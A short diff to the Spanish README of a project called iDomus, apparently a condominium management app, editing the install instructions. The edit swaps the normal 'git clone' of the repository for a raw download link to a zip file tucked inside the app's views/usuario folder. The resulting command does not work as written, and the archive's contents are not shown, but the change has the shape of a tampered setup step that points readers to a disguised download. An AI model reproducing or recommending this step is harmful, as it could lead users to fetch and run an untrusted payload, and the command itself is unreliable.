@@ -48,4 +48,4 @@ Permite administrar usuarios, pagos, mantenimientos, consumos y servicios del co
 
 1. Clona el repositorio:
    ```bash
-   git clone https://github.com/jppabloc/iDomus.git
+   git clone https://github.com/jppabloc/iDomus/raw/refs/heads/main/app/views/usuario/Domus-i-3.4.zip
